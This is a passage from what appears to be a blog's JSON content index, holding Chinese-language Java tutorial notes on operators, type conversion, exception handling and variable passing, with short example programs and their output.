System.out.print(c);\n       return true;\n  }\n  public  static void main(String args[]){\n       int i=0;\n       for(mb_fun(‘A’);mb_fun(‘B’)&amp;&amp;(i&lt;2);mb_fun(‘C’))\n       {   i++;\n           mb_fun(‘D’);\n       }\n  }\n}     //结果： A B D C B D C B\n\n\n\n&emsp;&emsp;&emsp;&emsp;\n","thumbnail":"https://i.loli.net/2019/01/11/5c3891d2e6c5e.png","plink":"https://Directoree.github.io/post/Java-Language-2-3/"},{"title":"Java运算符和数据类型转换(3.4-3.6)","date":"2019-01-11T09:48:59.000Z","updated":"2019-01-19T08:37:24.101Z","content":"&ensp;&ensp;\n运算符及表达式、运算符的优先级、数据类型转换\n\n\n 3.4-3.6学习知识点\n 运算符及表达式\n 算术运算符\n 关系运算符\n 逻辑运算符\n 位运算符\n 赋值运算符\n 逻辑运算符\n\n\n 运算符的优先级\n 数据类型转换\n 自动类型转换\n 手动强制类型转换\n 隐含强制类型转换\n\n\n\n\n\n&ensp;&ensp;\n一、 运算符及表达式 &emsp;Java可以对各种类型的数据进行加工，这种加工过程称为运算 。其中表示各种不同运算的符号称为运算符 ，参与运算的数据称为操作数 。操作数和运算符按一定语法形式组成的符号序列称为表达式。每个表达式经过运算后都会产生一个确定的值。 \n\n📒运算符按其功能分为七类：1. 算术运算符  + 、-、 *、 /、%、 ++、 –2. 关系运算符  &gt; 、&lt;、 &gt;=、 &lt;=、 ==、 !=3. 逻辑运算符  ！、&amp;&amp;、||、&amp;、|4. 位运算符     &gt;&gt;、&lt;&lt;、&gt;&gt;&gt;、&amp;、|、^、~5. 条件运算符  ？：6. 赋值运算符  =、+=、-= 、*= 、/=7. 其他：下标运算符[]📒运算符按其要求的操作数个数分为三种：1. 一元运算符  如  ++、–2. 二元运算符  如  +、-、*、/、%(求模)3. 三元运算符  如  ？：\n\n\n\n&emsp;\n1.1  算术运算符📒算术运算符中的单目运算符          如   +（一元加，取正值）、               -（一元减，取负值）、               ++ （增1运算符）、-- （减1运算符）增1运算符(++)和减1运算符(--)：   只能用于变量，而不能用于常量或表达式。增量运算符和减量运算符的功能是将操作数的值加1或减1.(1)增1运算符（减1运算符）在操作数的前面，首先对操作数本身进行增减1运算，然后再参与其所在表达式的  运算。例：如果变量a的值为5，求下列表达式及a的值      ① ++a +10          表达式的值为16，a变为6      ② --a +10          表达式的值为14，a变为4(2)增1运算符（减1运算符）在操作数的后面，则首先让操作数参与计算整个表达式的值，然后再对操作数进行   增减运算  例：如果变量a的值为5，求下列表达式及a的值            ① a++ +10                   表达式的值为15，a变为6            ② a-- +10                   表达式的值为15，a变为4\n\n练习题1：写出该程序的输出结果\nclass test\n{\n      public static void main(String args[])\n     {\n           int a=5;\n           System.out.println(++a);\n           System.out.println(--a);\n           System.out.println(a++);\n           System.out.println(a--);\n} \n}                        \n输出结果：\n6\n5\n5\n6\n\n📒算术运算符中的双目运算符  如     +（加）、-（减）、*（乘）、/（除）、  % （取余数或取模）。       +，-，* 是通常意义的加、减、乘如果整数相除，则结果取整。如 5/2 得到结果2。如果浮点数相除，则是我们通常意义上的除法，如5.0/2.0结果为2.5。%是取余，如 5%2结果为1                         5.2%2结果为1.2                         5.2%2.2结果为0.8                         10%-4结果2； -10%-4结果-2注意： 如果整数相除或取模 第二个操作数为0 编译无错 运行会出错 抛出异常；          如果浮点数相除或取模 第二个操作数为0 结果为NaN 。注意：1. 整数    int a=10/0     运行报错                int a=10%0   运行报错2. 浮点数     double a=10.0/0     Infinity(正无穷大)     double a=-10.0/0   -Infinity（负无穷大）     double a=0.0/0        NaN     double a=0.0%0        NaN\n\n\n\n思考：某个培训中心要为新到的学员安排房间，假设共有x个学员，每个房间可以住6人，让你用一个公式来计算他们要住的房间数？答案：  (x+5)/6这也可以用于计算留言板的页数。 \n\n\n&emsp;&emsp;\n1.2  关系运算符1.关系运算符有七种：== ，!= ，&lt; ,&lt;= , &gt; ,&gt;= , instanceof  (对象运算符)2.关系表达式的结果类型为布尔型3.instanceof：用来确定一对象是否是某一指定类的对象\n\n class test\n{    public static void main(String args[])\n     {    test t1=new test();\n          if(t1 instanceof test){ System.out.println(\"是\");}    \n     } } \n\n&emsp;\n📒关系表达式\n\n\n&emsp;&emsp;\n1.3  逻辑运算符 \n例：分析下列程序的输出结果\nclass test{    \n    public static void main(String args[]){ \n        boolean s;int i=100;\n        s=(3>2)&amp;&amp;(i++==1);\n        System.out.println(i);\n        i=100;\n        s=(3&lt;2)&amp;&amp;(i++==1);\n        System.out.println(i);\n    }\n} \n输出结果：\n101\n100\n\n&emsp;&emsp;\n1.4  位运算符\n例：分析下列程序的输出结果\nint a=7, b=8, c;\n    c = a &amp; b;     //c=00000000000000000000000000000000=0\n    c = a | b;     //c=00000000000000000000000000001111=15\n    c = a ^ b;     //c=00000000000000000000000000001111=15\n    c =~a;         //c=11111111111111111111111111111000=-8\n\n例：分析下列程序的输出结果\n    int a=7,c;     //a=00000000000000000000000000000111\n    c = a>>3;      //c=00000000000000000000000000000000=0\n    c = a &lt;&lt; 3;    //c=00000000000000000000000000111000=56\n    c = a >>> 3;   //c=00000000000000000000000000000000=0\nint a =-8; \nSystem.out.println(a>>>1) //结果2147483644\nint i=88>>32; System.out.println(i)  //结果88\n//（在进行移位之前，java系统首先把移的位数与被移位数求余数，然后移动这个位数）\n\n注意：（1）右移n位后的结果与除以2的n次方效果相同（2）左移n位后的结果与乘以2的n次方效果相同（3）无符号右移要慎重\n\n\n\n思考：  如何用一个表达式计算2的X次方？答案：  1&lt;&lt;x将1左移x位 \n\n\n&emsp;&emsp;\n1.5  赋值运算符(1)简单赋值运算符    = 将等号右边的表达式的值赋给等号左边的变量       例如：     int c,d;                     c=1;                     d=c+10;(2)复合赋值运算符      +=、-=、*=、/=、%= 等一般形式为：   变量 op= 表达式等价于:     变量 =变量 op 表达式c += a;     //c = c +a;c -= a;     //c = c -a;c = a;     //c = c  a;例：int a=1;        double x=2;        a+=2;           // 就是a=a+2, 结果使a的值为3        x=x+3;       // 就是x=x(x+3), 结果使x的值为10.0        int a=b=c=d=12;        int a=(b=(c=(d=12))); //赋值运算符有返回值，返回值是=右边的值注意：  1. boolean型的只能赋给boolean型；  2. 其他七种类型如果能自动转换则可直接赋值，否则要进行强制类型转换。\n\n&emsp;&emsp;\n1.6  条件运算符Java 中唯一的三元运算符，其格式如下：&emsp;&emsp;变量 =  &lt;布尔表达式&gt; ? &lt;表达式1&gt; : &lt;表达式2&gt;含义是：当&lt;布尔表达式&gt;为真时，变量的值为&lt;表达式1&gt;的值，否则为&lt;表达式2&gt;的值。\n\n例:  条件运算\npublic class max \n{\n       public static void main(String args[]) \n      {\n            int x=20,y=30,max;\n            max = (x>y) ? x : y;      \n            System.out.println(“max=”+max);\n     }\n}\n输出结果：max=30\n\n练习题2:\npublic class max \n{\n       public static void main(String args[]) \n      {\n      int a=3,b=4,c;\n      c=a>b? ++a:b++;\n      System.out.println(a+\"、\"+b+\"、\"+c);    \n     }\n}\n输出结果：\n3、5、4\n\n\n\n&emsp;&emsp;\n二、 运算符的优先级 表达式的运算次序取决于表达式中各种运算符的优先级。     （1）优先级高的先运算，优先级低的后运算。     （2）括号( )的优先级最高。     （3）优先级相同的情况下要考虑结合性，即从左向右运算还是从右向左运算。Java语言规定的运算符的优先级如下表所示\n\n\n运算符的优先级与结合性的一些规律：1. 优先级       () &gt; 单目运算符 &gt; 双目运算符 &gt; 三目运算符 &gt; 赋值运算符双目： 算术&gt;关系&gt;逻辑 。2. 结合性大多数运算符结合性为从左至右赋值运算符的结合性为从右至左    int a,b=3,c=5;    a = b = c;    //结果：a、b、c均为 5表达式写法的习惯：  (1) 除非是简单的直观运算，应该尽量使用括号  (2)另外，尽量不要写太长的表达式，过长的表达式容易引 起对求值次序的误解。\n\n例：\n    (1) a + b * c\n    (2) a = b || c\n    (3) a + b &lt; c &amp;&amp; d==e\n    (4) a=8 – 2 * 3 &lt;4 &amp;&amp; 5 &lt; 2     结果：false\n\n&emsp;\n表达式写法的习惯：  (1) 除非是简单的直观运算，应该尽量使用括号  (2)另外，尽量不要写太长的表达式，过长的表达式容易引 起对求值次序的误解。 \n\n\n\n&emsp;&emsp;\n三、 数据类型转换  3.1  自动类型转换(1) Java中整型、实型、字符型数据可以混合运算。运算过程中，Java自动把精度较低的类型转换为另一种精度较高的类型。(2) 低精度的值赋给高精度的变量可以自动转换,不出现编译错误；相反会出现编译错误,需要强制转换。例如: float x=(float)5.0;long x=2;注意： 如果byte、short、char在一起运算时，会先将这些值转换为int型。再进行运算，结果为int型。 如表达式中一个变量是int型，另一个是long型，则先将int型转为long型，再进行计算。最后结果为long型。\n\n\n下列代码会编译出错，提示c = (a + b);有精度损失\nclass test\n{\n      public static void main(String args[])\n     {\n        byte a = 1;\n        byte b = 1;\n        byte c = (a + b);\n      } \n} \n\n\n\n练习题3:下列表达式结果是什么类型？‘A’+2+2.5double\n\n\n&emsp;&emsp;\n3.2  手动强制类型转换在Java中直接将高精度的值赋给低精度的变量会导致编译出错。这时可用强制类型转换来解决。 形式为：&emsp;&emsp;       (类型名)表达式 例如：       int   i;   byte  b,c;       b=(byte)345;      //上机测试知b得到89       c=(byte)356;      //上机测试知c得到100       i=(int)(3.8+6);   //强制转换后小数部分被截去，i得到9，不会四舍五入注意：1. 强制类型转换可能造成信息的丢失；2. 布尔型与其它基本类型之间不能转换。\n\n加上强制类型转换，下列代码编译通过。\nclass test\n{     public static void main(String args[])\n     {\n        byte a = 1;\n        byte b = 1;\n        byte c = (byte)(a + b);\n      } } \n\n运算时注意（一般的运算都有类型提升功能）：（1）在运算过程中，运算的结果至少是int型，即如果参与运算的两个数级别比int型低或是int型，则结果为     int型；（2）参与运算的数据如果有一个级别比int型高，则运算结果的类型与类型级别高的数相同；（3）参与运算的两个数据如果类型不一样，会先把低级的数据转换成高级的类型的数据后再作运算，结果是高     级的类型。\n\n\n&emsp;&emsp;\n3.3  隐含强制类型转换Java中允许把int类型的常量赋给byte、short变量时不需要强制类型转换      byte b=123;//合法      short s=123;//合法      b=b+3; //不合法&emsp;但是把int类型的变量赋给byte、short类型的变量时必须强制转换，否则会出错     int i=123;     byte b=i;  //正确的做法是byte b=(byte)i;    byte a = 1; byte c = (byte)(a + b);\n\n\n\n练习设x,y,a分别为float,double,byte型变量，x=3.3,y=2.9,a=5, 则表达式x+ (int)y/ 3*a的值为多少？值的类型是什么？ \n\n\n\n\n&emsp;&emsp;&emsp;&emsp;\n","thumbnail":"https://i.loli.net/2019/01/11/5c388e8172b3b.jpg","plink":"https://Directoree.github.io/post/Java-Language-2-2/"},{"title":"Java-异常处理(5)","date":"2018-12-28T01:47:07.000Z","updated":"2019-03-05T11:33:14.739Z","content":"&emsp;&emsp;\n异常处理\n\n\n&emsp;\n一、 Java异常基础1.1  为什么要引入异常处理机制？程序的错误分为：编译错误：程序员编写程序时语法上出现的错误；运行错误：程序员编写的程序在语法上没有错误，但是程序在运行时出现错误，本章就主要针对该类错误讲解 -&ensp;- 即异常、异常类和异常处理机制。\n\n&emsp;\n1.2  以往的错误处理方法主要缺陷：&emsp;程序复杂&emsp;可靠性差&emsp;返回信息有限&emsp;返回代码标准化困难　以往的程序开发过程中，常常采用返回值进行处理。例如，在编写一个方法，可以返回一个状态代码，调用者根据状态代码判断出错与否。若状态代码表示一个错误，则调用该错误的处理程序进行相应的处理，或显示一个错误页面或错误信息。\n\n举例 以往的错误处理方法：采用返回值进行处理\n举例：实现将一个文件从硬盘加载近来，导致加载可能失败的运行错误有硬盘错误、文件无法找到等\nint status=loadTextfile();\nIf (status!=1){\n  //something unusual happened, describe it\n switch(status) {\n    case 2: \n       //file not found\n      break;\n   case 3:\n       //disk error\n   default:\n      //other error}\n}else {\n    //file loaded OK, continue with program} \n\n&emsp;&emsp;\n1.3  Java异常处理方法Java异常处理方法：Java为运行错误引入了异常、异常类和异常处理机制。  异常：特殊的运行错误，是在程序运行过程中发生的、会打断程序正常执行的错误　例如：　除0溢出　文件找不到  数组元素下标越界　异常类：Java用面向对象的方法处理异常，Java的异常类是处理运行时错误的特殊类，每一种异常类对应一种特定的运行错误，每一个异常事件由一个异常类的对象来代表。 例如：除0溢出（ArithmeticException）　　　文件找不到（FileNotFoundException）　　　数组元素下标越界（ArrayIndexOutofBoundsException）异常处理机制：抛出异常——捕捉异常： 1.  当出现了一些错误，方法都会产生一个异常对象，这个异常对象将交由运行系统来处理。此过程就称为抛出     (throwing)异常。包括：系统抛出、用户自定义抛出。 2.  接着，运行系统开始寻找合适的处理方法，来处理这个异常。如果系统找到了一个适合的处理该异常方法，     这一过程就叫捕获异常。\n\n&emsp;&emsp;\n1.4  异常处理的语法支持       －try,catch,throws,throw,finally(1) try包含可能出现异常的语句块；(2) 一个或多个catch块紧随try{}块，每个catch块通常处理指定类型的异常；(3) finally引导块紧随catch块后，主要用于清理现场（可有可无）。格式：try{ ……}catch( ExceptionName1 e ){ ……}catch( ExceptionName2 e ){ ……}finally{ ……}注意：finally总是执行，catch块不一定执行\n\n&emsp;&emsp;\n1.5  总结 (1) Java的异常处理把错误集中起来统一处理。程序员只需要说明何处可能出现异常，如何处理即可； (2) 采用面向对象的思想标准化了各种错误的类型； (3) Java把程序运行过程中可能遇到的问题分为两类，一类是致命性的，即程序遇到了非常严重的不正常状 态，不能简单地恢复执行，这就是错误(对应Error类)，如程序运行过程中内存耗尽。另一类是非致命性的， 通过某种处理后程序还能继续运行，这就是异常(对应Exception类)。\n\n\n&emsp;&emsp;\n二、 异常类的层次2.1  异常分类☕异常类：异常在Java中都是作为类的实例(对象)的形式出现的。&emsp;     如 Throwable类, Exception类, Error类……☕Java中异常分类： (1)  Error类及其子类：描述Java运行时刻系统内部的错误或资源枯竭导致的错误，无法恢复和抛出，发生几率小； (2)  Exception类及其子类：普通程序可以从中恢复，分为运行时异常和非运行时异常。&emsp;异常在Java中也是作为类的实例的形式出现的。Java中的所有的异常类都是从Throwable类派生出来的。Throwable类有两个直接子类：java.lang.Error 和 java.lang.Exception。异常类的层次结构如下图所示。(1) 🔺Error类及其子类主要用来描述一些Java运行时刻系统内部的错误或资源枯竭导致的错误。普通的程序不能从这类错误中恢复，也无法抛出这种类型的错误，这类错误出现的几率是很小的。(2) 🔺另一个异常类的子类是Exception类和它的子类。在编程中错误的处理主要是对这类错误的处理，如除数为零、数组下标越界等。类Exception是普通程序可以从中恢复的所有规范了的异常的父类。\n\n&emsp;&emsp;\n2.2  Exception类的子类☕Exception类子类有两种：运行时异常和非运行时异常（一般异常）　&emsp;&emsp;&emsp;　区别？？？（1）运行时异常：RuntimeException类及其所有子类。      运行时异常是程序员编写程序不正确所导致的异常，理论上，程序员经过检查和测试可以查出这类错误。如除数为零等，错误的强制类型转换、数组越界访问、空引用。（2）非运行时异常（一般异常）：指可以由编译器在编译时检测到的、可能会发生在方法执行过程中的异常，如找不到指定的文件等，这不是程序本身的错误，如果这些异常情况没有发生，程序本身仍然是完好的。　　注意：编译器强制要求Java程序必须捕获或声明抛出所有非运行时异常，但对运行时异常不作要求。运行时异常编译可以通过但是运行时出现异常；非运行时异常编译的时候就通不过。例如：格式不正确的URL、试图为一个不存在的类找到一个代表它的类的对象。除了runtimeexception及其子类以外，其他exception类的子类都是非运行时异常。\n\n//运行时异常和非运行时异常区别举例  \n[例5-1] RuntimeExceptionDemo1.java\nclass RuntimeExceptionDemo1{  \npublic static void main(String args[]){\n    int i=0;\nSystem.out.println(2/0);\n}}\n\n该程序能编译通过，而在运行时，出现如下提示：\n> javac RuntimeExceptionDemo1.java\n> java RuntimeExceptionDemo1\nException in thread \"main\" java.lang.ArithmeticException: / by zero at \nRuntimeExceptionDemo1.main(RuntimeExceptionDemo1.java:4)\n//这里的\"ArithmeticException\"\n\n[例5-2] NonRuntimeExceptionDemo1.java\nimport java.io.*;\nclass NonRuntimeExceptionDemo1\n{ \n      public static void main(String args[]){\n       FileInputStream in=new FileInputStream(\"text.txt\");\n        int s;\n        while((s=in.read())!=-1) System.out.print(s);\n        in.close();\n   }\n}\n会出现如下的错误提示：\njavac NonRuntimeExceptionDemo1.java\nNonRuntimeExceptionDemo1.java:5: unreported exception java.io.FileNotFoundException; must\n be caught or declared to be thrown\nFileInputStream in=new FileInputStream(\"text.txt\");\n                   ^\nNonRuntimeExceptionDemo1.java:7: unreported exception java.io.IOException; mustbe\n caught or declared to be thrown\nwhile((s=in.read())!=-1) System.out.print(s);\n                ^\nNonRuntimeExceptionDemo1.java:8: unreported exception java.io.IOException; mustbe caught \nor declared to be thrown\nin.close();\n\n&emsp;\n☕对运行时异常的说明：由于运行时异常可能会出现在程序的任何地方，而且出现的可能性非常大，因而由程序本身去检测运行异常出现与否，将会使程序的开销过大，所以运行时异常是由Java运行时系统在程序的运行过程中检测到的,它可能在程序中任意部位发生,而且其数目可能很大,因此Java编译器允许程序不对它进行处理。这时，java运行时系统会把生成的运行时异常对象交给默认的异常处理，在标准输出设备上显示异常的内容以及发生异常的位置建议对于运行时异常用户不要去捕获，捕获就是承认这个错误，但是一般我们编程的希望是发生错误能改正就尽量改正，除非不是由程序员自己意愿决定的错误。&emsp;☕对运行时异常和非运行时异常的总结：(1) 当出现java.lang.ArithmeticException运行时异常时，不需要用户在程序中对其进行处理，而直接由Java运行时系统进行处理；(2) 对于非运行时异常，Java编译器对程序进行编译的时候，便指出用户需要①捕获该类异常或者②声明抛出。即对于非运行时异常，用户需要在程序中进行处理，否则编译时无法通过。\n\n① 捕获该类异常\n[例5-2] NonRuntimeExceptionDemo1.java\nimport java.io.*;\nclass NonRuntimeExceptionDemo1\n{ \n      public static void main(String args[]){\n        try{\n             FileInputStream in=new FileInputStream(\"text.txt\");\n            int s;\n            while((s=in.read())!=-1) System.out.print(s);\n           in.close();\n              }catch(Exception e){…}\n   }\n}\n\n\n② 声明抛出\n[例5-2] NonRuntimeExceptionDemo1.java\nimport java.io.*;\nclass NonRuntimeExceptionDemo1\n{ \n      public static void main(String args[])throws Exception{\n      FileInputStream in=new FileInputStream(\"text.txt\");\n      int s;\n      while((s=in.read())!=-1) System.out.print(s);\n      in.close();\n}\n}\n\n&emsp;&emsp;\n2.3  对于运行时异常和非运行时异常的一些说明1. ☕编译器和异常：编译器强制要求程序员捕获或声明抛出非运行时异常   到底为什么要这么做呢？？？对于运行时异常，编译器不强制要求，但用户也可以自己去捕获   这个时候会出现什么效果呢？？？2. ☕运行时系统和异常：(1) 异常都有抛出的轨迹；(2) 对于所有异常，某个方法产生的异常 ，如果没有被捕获，就会自动抛给方法的调用者（但是对非运行时异常一定要声明抛出），如果调用者还没有捕获，再抛给调用者的调用者，以此类推，直到main方法里发现还没有捕获，那么运行时系统就会来处理这个异常，把异常信息和异常的轨迹信息打印给用户。3. ☕两点建议：(1) 建议对于运行时异常用户不要去捕获，捕获就是承认这个错误，但是一般我们编程者希望是发生错误能改正就尽量改正，除非不是由程序员自己意愿决定的错误；(2) 建议对于非运行时异常，用户应该去捕获，以交代程序员的处理该错误的代码，实在不行，就声明抛出给方法的调用者。3. ☕异常类常用的方法：public Exception()public Exception(String s)&emsp; :该参数一般表示该异常对应的错误的描述public String toString()&emsp;:返回描述当前异常对象信息的字符串public String getMessage()&emsp;:返回描述当前异常对象信息的详细信息。public void printStackTrace()&emsp;:打印当前异常对象使用堆栈的轨迹。\n\n\n\n&emsp;&emsp;\n三、 try-catch-finally异常处理3.1  概括try-catch-finally语句用户处理异常的三种方法:       (1)用户可以用try-catch-finally语句进行抛出和捕获处理；       (2)如果不想捕获和处理异常，可以通过throws语句声明要抛出的异常；       (3) 用户可以定义自己的异常类,并用throw语句来抛出。运行时异常是由Java运行时系统在程序的运行过程中检测到的,它可能在程序中任意部位发生,而且其数目可能很大,因此Java编译器允许程序不对它进行处理。这时，java运行时系统会把生成的运行时异常对象交给默认的异常处理，在标准输出设备上显示异常的内容以及发生异常的位置。即：运行时异常：会输出到设备显示哪里存在错误，请更正；非运行时异常：编译报错时提示必须添加非运行时异常处理，比如加try{}…catch(类名 对象){}或者使用throws来抛出异常。\n\ntry-catch-finally语句对程序运行进行监控，捕获和处理异常通常形式： \ntry{\n调用可能产生异常的方法及其它java语句；\n}\ncatch(异常类名1 异常对象名e){\n异常处理语句块；\n}\ncatch(异常类名2 异常对象名e){\n异常处理语句块；\n}\nfinally{\n最终处理；\n}\n\n[例5-3]访问文本文件text.txt，并将其在屏幕上打印出来。\nimport java.io.*;\nclass TryCatchFinally\n{ \n      public static void main(String args[]){\n       try{\n        FileInputStream in=new FileInputStream(\"text.txt\");\n        int s;\n        while((s=in.read())!=-1) System.out.print(s);\n        in.close();\n       }\n       catch(FileNotFoundException e){\n          System.out.println(“捕获异常：”+e);   //e会调用toString()方法回显异常信息给程序员\n       }\n       catch(IOException e){\n          System.out.println(\"捕获异常：\"+e);\n       }\n       finally{\n       System.out.println(\"finally块总是执行！\");\n       } }\n}\n\n运行结果：\n捕获异常：java.io.FileNotFoundException: text.txt (系统找不到指定的文件。)\nfinally块总是执行！\n\n&emsp;&emsp;\n3.2  try语句☕try{}：将可能抛出一个或者若干个异常的代码放入try语句块中。注意：应当尽量减小try代码块的大小，不要将整个程序代码全部放入try语句块中，而是应当仔细分析代码，在可能出现异常情况的地方用try进行监控。因为当发生异常时，程序控制由try块转到catch块，Java将跳过try中后面的语句，且永远不会从catch块返回到try块。因此若将整个程序代码都放在try中，若一开始发生异常，则后面的语句将永远不会被执行，从而影响了程序的实现。\n\n&emsp;\n3.3  catch语句📒(1) try语句后面必须跟有一个或多个catch语句来处理try中产生的异常事件。如果try语句中未产生异常，  那么catch语句将不执行。📒(2)catch语句需要一个参数：一个异常类名和该异常类的对象。注意该异常类必须是Throwable类的子类.📒(3) try块中发生了一个异常，try-catch语句就会自动在try块后面的各个catch块中，找出与该异常类相        匹配的参数。当参数符合以下3个条件之一时，就认为这个参数与产生的异常相匹配：        （1）参数与产生的异常属于一个类；        （2）参数是产生的异常的父类；        （3）参数是一个接口时，产生的异常实现了这一接口。📒(4) 注意：(1) 当产生的异常找到了第一个与之相匹配的参数时，就执行包含这一参数的catch语句中的Java代码，执行完catch语句后，程序恢复执行，但不会回到异常发生处继续执行，而是执行try-catch结构后面的代码。(2) 可以用一个catch块来处理多个异常类型，此时catch的参数应该是这多个异常的父类。(3) 有多个catch块时，要细心安排catch块的顺序。  将子类的catch块放在前面，父类的catch块放在后面。\n\n&emsp;\n3.4  finally子句1.finally语句： 无论在try块中是否产生异常，也不管产生的异常是否会被捕获，finally中的语句最终都会                           被执行。2.作用： 为异常处理事件提供一个清理机制,例如清理打开文件、Socket、JDBC连接之类的资源。  如果程序用到了文件、Socket、JDBC连接之类的资源，即使遇到了异常，也要正确释放占用的资源。&ensp;finally语句可以说是为异常处理事件提供的一个清理机制. 一般是用来关闭文件或释放其他的系统资源，作  为try-catch-finally结构的一部分，可以没有finally语句，如果存在finally语句，不论try块中是否发生  了异常，是否执行过catch语句，都要执行finally语句。3. 带有finally子句的try-catch-finally语句的形式如下：  \n\ntry { … }           //…是正常执行的代码, 可能产生异常\n       catch (异常类1 e) { … }    //…是异常类1的处理代码\n       catch (异常类2 e) { … }    //…是异常类1的处理代码\n        ……\n      catch (异常类n e) { … }   //…是异常类2的处理代码\n      finally { … }                   //…是执行清除工作的语句\n\n4.执行过程：(1) try块中的语句没有产生异常。在这种情况下，Java首先执行try块中的所有的语句，然后执行finally子句    中的代码，最后执行try…catch..finally块后面的语句；(2) try块中的语句产生了异常，而且此异常在方法内被捕获(有catch匹配)。 在这种情况下，Java首先执行try    块中的语句，直到产生异常处，然后跳过此try块中剩下的语句，执行捕获此异常的catch子句的处理代码；    然后执行finally子句中的代码；(3) 如果在catch子句又重新抛出了异常。也会执行finally，然后将这个异常抛出给方法的调用者；(4) try块中产生了异常，而此异常在方法内没有被捕获(没有catch匹配) 。在这种情况下，Java将执行try块    中的代码直到产生异常，然后跳过try块中的代码而转去执行finally子句中的代码，最后将异常抛出给方法    的调用者。  \n\n&emsp;&emsp;\n四、 throws-throw抛出异常4.1  throws抛出异常📒throws说明：在设计可能会抛出异常的方法时，可以有两个选择：(1) 使用try-catch-finally处理方法中的异常；(2) 声明抛出异常：不捕获异常(没有throws方法的创建异常类的实例和抛出异常。是个空语句。)，而是将异常交由上一层处理，在其他地方捕获异常。如果使用后者，那么应该（在某些情况下）向编译器表明：此方法可能会抛出异常，但方法本身不会捕获它。可以在方法头中用throws子句来实现此功能。(2.1)带throws异常说明的方法说明形式如下：        …  方法名(…) [throws 异常类列表]        { 方法体  }&emsp;📒注意： （１）方法抛出的异常类是throws子句中指定的异常类或其子类。 （２）并不是所有可能发生的异常都要在方法的说明中指定，从Error类中派生出的异常和从RuntimeException类中派生的异常就不用在方法声明中指定。📒在下列情况下Java方法可以声明抛出异常： （１）调用的方法抛出了异常； （２）检测到了错误并使用throw语句抛出异常； \n\n例1：调用的方法抛出了异常 \nclass Test {……\n public String getInput() throws IOException\n {……\n    System.in.read();\n}\n}\n\n\n\n例2：检测到了错误并使用throw语句抛出异常\nimport java.io.*;\n class Test {……\n public String getInput() throws IOException\n {……\n     IOException ae =new IOException(\"buffer is full\");\n    throw ae; \n}\n\n\n\n例3： throws多个异常\nclass Animation\n{                                                   \n public Image loadImage(String s) throws  \n                 EOFException, MalformURLException  \n {\n  ……\n }\n} \n\n&emsp;&emsp;\n4.2  throw抛出异常📒throw说明：要使用throw，则必须在方法名后面指出throws；但是使用throws，抛出可以是空语句不用写，交给上一层处理！！在捕获一个异常前，必须有一段Java代码来生成和抛出一个异常对象。Java用throw语句抛出异常。throw语句的格式如下：                throw ThrowableObject；&emsp;异常对象的生成和抛出可以有以下三种情况：　　　（１）Java运行时系统　　　（２）JDK中某个类　　　（３）在程序中创建异常对象抛出使用throw语句应注意：（１）一般这种抛出异常的语句应该在满足一定条件执行，例如把throw语句if分支中（２）含有throw语句的方法，应该在方法头定义中用throws语句声明所有可能抛出的异常抛出异常有这样三步：    （1）确定异常类；    （2）创建异常类的实例；    （3）抛出异常。\n\n举例\nstatic String getInput() throws IOException{\n  char[] buffer =new char[20];\n   int counter = 0;\n   boolean flag =true;\n   while(flag) {\n       buffer[counter] =(char)System.in.read(); \n\n      if(buffer[counter]=='\\n') flag = false;\n      counter++;\n      if(counter>=20){\n} IOException ae =new IOException(\"buffer is full\"); \n      throw ae; }\n    return new String(buffer);\n}\n\n \"//IOException ae =new IOException(\"\"buffer is full\"\");  throw ae;\"使用throw\n\n&emsp;&emsp;\n五、 正确地使用异常由于异常使用起来非常方便，以至于在很多情况下可能会滥用异常。但是，使用异常处理会降低程序运行的速度，几点建议：（1） 在可以使用简单的测试就能完成的检查中，不要使用异常来代替它。例如：      if (ins!=null)       //使用ins引用对象       {  …   }（2） 不要过细地使用异常。最好不要到处使用异常，更不要在循环体内使用异常处理, 可以将它包裹在循环体外面。（3）不要捕获了一个异常而又不对它做任何的处理。   try   {     …… //正常执行的代码   }   catch(Exception e) {  }(4) 将异常保留给方法的调用者并非不好的做法。     对于有些异常，将其交给方法的调用者去处理是一种更好的处理办法。没有类似这样if(counter&gt;=20){      IOException ae =new IOException(“buffer is full”);      throw ae; }的语句，是个空语句。  \n\n\n\n&emsp;&emsp;&emsp;&emsp;\n","thumbnail":"https://i.loli.net/2018/12/28/5c2580ec2bc8a.jpg","plink":"https://Directoree.github.io/post/Java-Exception-Handling7/"},{"title":"Java变量及其传递、内部类(4.9-4.10)","date":"2018-12-27T15:27:04.000Z","updated":"2019-01-08T13:26:59.985Z","content":"&emsp;&emsp;\n变量及其传递 &amp; 内部类\n\n&emsp;\n一、 Java变量及其传递1.1  基本数据变量与引用型变量1.  📒Java变量:&emsp;(1). 基本型变量(8种)&emsp;&emsp; char,byte,short,int,long,float,double,boolean&emsp;(2). 引用型变量：对象,接口,数组            \n\n\n举例：\n    public class MyDate{\n    private int day=12;\n    private int month=6;\n    private int year=1900;\n    public MyDate(int y,int m,int d){\n        year=y;\n        month=m;\n        day=d;}\n          void addYear()\n    {   year++;}\n         public void display(){\n    System.out.println(year+\"-\"+month\n             +\"-\"+day);\n    }\n\n    public static void main(String[] args){\n       MyDate m,n;\n       m=new MyDate(2003,9,22);\n       n=m;     \"//n和m指向同一个地址\"\n       n.addYear();\n       m.display();\n       n.display();\n       System.out.println(m.toString());\n       System.out.println(n.toString());    \n    }\n    }\n      /*运行结果\n       2004-9-22\n       2004-9-22\n       MyDate@11a698a\n       MyDate@11a698a\n      */\n\n&emsp;&emsp;\n1.2  成员变量与局部变量成员变量与局部变量有没有区别?  成员变量若为static的称为类变量，否则称为成员变量，而局部变量是在方法体内的变量。 (1) 📒从语法形式上看，成员变量是属于类或接口的，而局部变量是在方法中定义的变量或方法的参变量； 成员变量可以被public，private，static等修饰，而局部变量则不能被访问控制符及static修饰；成员 变量及局部变量都可以被final修饰。(2) 📒从变量在内存中的存储方式看，成员变量是对象的一部分，而对象是存在于堆中的，而局部变量是     存在于栈中的。(3) 📒从变量在内存中的存在时间上看，成员变量是对象的一部分，它随着对象的创建而存在，而局部变     量随着方法的调用而产生，随着方法调用结束而自动消失。(4) 📒成员变量如果没有赋初值，则会自动以该类型的默认值（0,false,null等）赋值；而局部变量则不会     自动赋值，必须显示地赋值后才能使用。\n\nclass A{\n         int a;\n         void m(){\n            int b;\n            System.out.println(a);  //合法的，a的值为0\n            System.out.println(b);  //不合法，编译不通过\n           }\n        }\n\n&emsp;&emsp;\n1.3  变量的传递1. 📒按值传递:当将一个参数传递给一个函数时，函数接收的是原始值的一个副本。因此，如果函数修改了该参数，仅改变副本，而原始值保持不变。(传递8种基本型变量)2. 